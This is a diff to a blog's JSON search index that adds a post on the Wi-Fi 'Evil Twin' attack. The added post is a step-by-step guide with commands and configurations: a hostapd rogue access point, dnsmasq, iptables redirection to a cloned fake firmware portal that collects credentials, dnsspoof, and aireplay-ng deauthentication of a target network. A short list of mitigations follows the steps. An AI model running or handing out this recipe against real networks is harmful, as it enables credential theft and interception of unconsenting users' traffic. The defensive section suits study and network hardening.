@@ -1,6 +1,23 @@
 [
   
   {
+    "title": "Evil Twin Attack",
+    "url": "/posts/Evil-Twin-Attack/",
+    "categories": "Exploits",
+    "tags": "Exploits, Evil Twin Attack",
+    "date": "2025-02-09 13:40:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) th...",
+    "content": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) that mimics a legitimate one. The goal is to force clients to disconnect from the legitimate network and reconnect to the malicious AP, which has the same SSID. Once connected, the attacker can intercept traffic, redirect users to a fake firmware upgrade page, and harvest credentials or other sensitive information.This attack can be executed using a Debian-based OS like Kali Linux without the need for additional hardware (though an external NIC may improve performance). Below is a step-by-step guide to setting up the attack, followed by mitigation strategies to defend against such exploits.Attack Overview  Objective:          Knock Wi-Fi clients off their legitimate network.      Force them to reconnect to a rogue AP with the same SSID.      Redirect traffic to a fake firmware upgrade portal to harvest credentials.        Tools:          hostapd: For creating the rogue AP.      dnsmasq: For DHCP and DNS spoofing.      apache2/nginx: For hosting the fake portal.      iptables: For traffic redirection.      aireplay-ng: For deauthentication attacks.        Prerequisites:          A wireless interface in monitor mode.      Basic knowledge of networking, social engineering, and web development.      Step-by-Step Execution1. Install Required Toolssudo apt install hostapd dnsmasq apache22. Set Wireless Interface to Monitor Modeiwconfig [iface] mode monitor3. Create Working Directorymkdir evil-twin &amp;&amp; cd evil-twin4. Configure hostapdCreate hostapd.conf:vim hostapd.confConfiguration:interface = [iface]driver = nl80211ssid = [ESSID of target]hw_mode = gchannel = [channel of target]macaddr_acl = 0ignore_broadcast_ssid = 05. Configure dnsmasqCreate dnsmasq.conf:vim dnsmasq.confConfiguration:interface = [iface]dhcp-range = 192.168.1.2, 192.168.1.30, 255.255.255.0, 12hdhcp-option=3, 192.168.1.1dhcp-option=6, 192.168.1.1server = 8.8.8.8log-querieslog-dhcplisten-address=127.0.0.16. Configure Network Interfaceifconfig [iface] up 192.168.1.1 netmask 255.255.255.07. Add Routing Rulesroute add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.18. Set Up IP Tables for Traffic Redirectioniptables --table nat --append PREROUTING -i [iface] -p tcp -j REDIRECT --to-ports &lt;ports running your portal&gt;9. Set Up the Fake Portal  Use tools like httrack to clone a legitimate firmware upgrade page.  Modify the HTML/CSS to make it convincing.  Set up a backend (e.g., Flask, Node.js) to handle user input.  Save credentials to a database or file.10. Start Serviceshostapd hostapd.confdnsmasq -C dnsmasq.conf -ddnsspoof -i [iface]11. Launch Deauthentication Attackaireplay-ng --deauth 0 -a [victim's BSSID] [iface]Mitigation Strategies1. Use Strong Encryption  Ensure your Wi-Fi network uses WPA3 encryption. If WPA3 is unavailable, use WPA2 with a strong passphrase.2. Monitor for Rogue APs  Deploy wireless intrusion detection systems (WIDS) to detect and alert on rogue APs.3. Implement Certificate-Based Authentication  Use 802.1X/EAP to authenticate devices connecting to your network. This prevents unauthorized devices from joining, even if they have the correct SSID and password.4. Educate Users  Train users to recognize suspicious activity, such as unexpected firmware upgrade prompts or certificate warnings.5. Disable Auto-Reconnect  Configure devices to not auto-reconnect to known networks without user confirmation.6. Regularly Update Firmware  Ensure all network devices are running the latest firmware to patch known vulnerabilities.7. Segment Your Network  Use VLANs to isolate sensitive devices and services from the rest of the network.8. Monitor Network Traffic  Use tools like Wireshark or Zeek to analyze network traffic for anomalies.9. Enable HTTPS Everywhere  Ensure all web-based services use HTTPS to prevent traffic interception.10. Deploy Honeypots  Set up honeypot APs to detect and analyze malicious activity."
+  },
+  
+  {
     "title": "OPSEC",
     "url": "/posts/opsec/",
     "categories": "OPSEC",
